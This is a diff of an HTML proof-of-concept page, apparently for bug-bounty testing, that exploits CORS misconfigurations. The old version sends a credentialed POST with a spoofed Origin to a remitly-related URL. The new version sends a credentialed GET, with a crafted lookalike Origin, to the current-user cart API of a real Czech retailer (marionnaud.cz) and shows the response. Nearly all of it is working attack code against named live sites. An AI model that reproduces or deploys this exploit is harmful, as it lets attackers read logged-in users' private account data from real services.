@@ -3,37 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Exploit POC</title>
+    <title>CORS Exploit PoC</title>
 </head>
 <body>
-    <h1>CORS Exploit Demonstration</h1>
-    <pre id="output">Sending request...</pre>
+    <h1>CORS Exploit PoC</h1>
+    <p id="output">Fetching data...</p>
     <script>
-        // CORS Exploit Request
-        fetch("https://remitly.tod8mp.net/xur/10408", {
-            method: "POST",
-            credentials: "include", 
+        // Fetch API to test CORS with a manipulated Origin
+        fetch("https://www.marionnaud.cz/api/v2/mcz/users/current/carts/current?fields=FULL&stocks=1&country=CZ&lang=cs_CZ", {
+            method: "GET",
+            credentials: "include",
             headers: {
-                "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
-                "Origin": "https://stargazer0.github.io" 
-            },
-            body: "_ir=U81%7C%7C1724675136005%7Ce436e5b4&custid=0413d465200d90b9d46a172afe2a6039"
+                "Origin": "https://www.marionnaud.cz.stargazer0.github.io"
+            }
         })
         .then(response => {
             if (response.ok) {
-                return response.json();
+                return response.text();
             } else {
-                throw new Error(`HTTP error! Status: ${response.status}`);
+                throw new Error(`CORS request failed with status: ${response.status}`);
             }
         })
         .then(data => {
-            document.getElementById("output").textContent = `Request succeeded: ${JSON.stringify(data)}`;
-            console.log("Data received:", data);
-            
+            document.getElementById("output").textContent = `Data received: ${data}`;
         })
         .catch(error => {
-            document.getElementById("output").textContent = `Request failed: ${error.message}`;
-            console.error("Error:", error);
+            document.getElementById("output").textContent = `Error: ${error.message}`;
         });
     </script>
 </body>
